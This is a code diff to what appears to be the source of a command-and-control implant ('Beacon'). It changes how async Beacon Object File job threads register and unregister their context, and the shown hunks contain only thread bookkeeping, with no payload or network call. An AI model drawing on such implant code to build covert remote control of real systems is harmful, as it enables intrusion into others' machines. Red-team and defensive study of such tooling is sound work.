@@ -629,19 +629,13 @@ HANDLE BeaconGetStopJobEvent(void)
 BOOL BeaconRegisterThreadCallback(DWORD dwThreadId)
 {
 #if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
-    PASYNC_BOF_CONTEXT ctx = tls_CurrentBofContext;
-    if (!ctx)
-        ctx = AsyncBofGetOutputContext();
+    /* Caller must already be on a registered async job thread */
+    PASYNC_BOF_CONTEXT ctx = AsyncBofFindByThreadId(GetCurrentThreadId());
     if (!ctx)
         return FALSE;
     if (dwThreadId == 0)
         dwThreadId = GetCurrentThreadId();
-    if (AsyncBofRegisterThread(ctx, dwThreadId)) {
-        /* If called from the new thread itself, set TLS */
-        if (dwThreadId == GetCurrentThreadId())
-            tls_CurrentBofContext = ctx;
-        return TRUE;
-    }
+    return AsyncBofRegisterThread(ctx, dwThreadId);
 #endif
     (void)dwThreadId;
     return FALSE;
@@ -653,8 +647,6 @@ void BeaconUnregisterThreadCallback(DWORD dwThreadId)
     if (dwThreadId == 0)
         dwThreadId = GetCurrentThreadId();
     AsyncBofUnregisterThread(dwThreadId);
-    if (dwThreadId == GetCurrentThreadId())
-        tls_CurrentBofContext = NULL;
 #else
     (void)dwThreadId;
 #endif
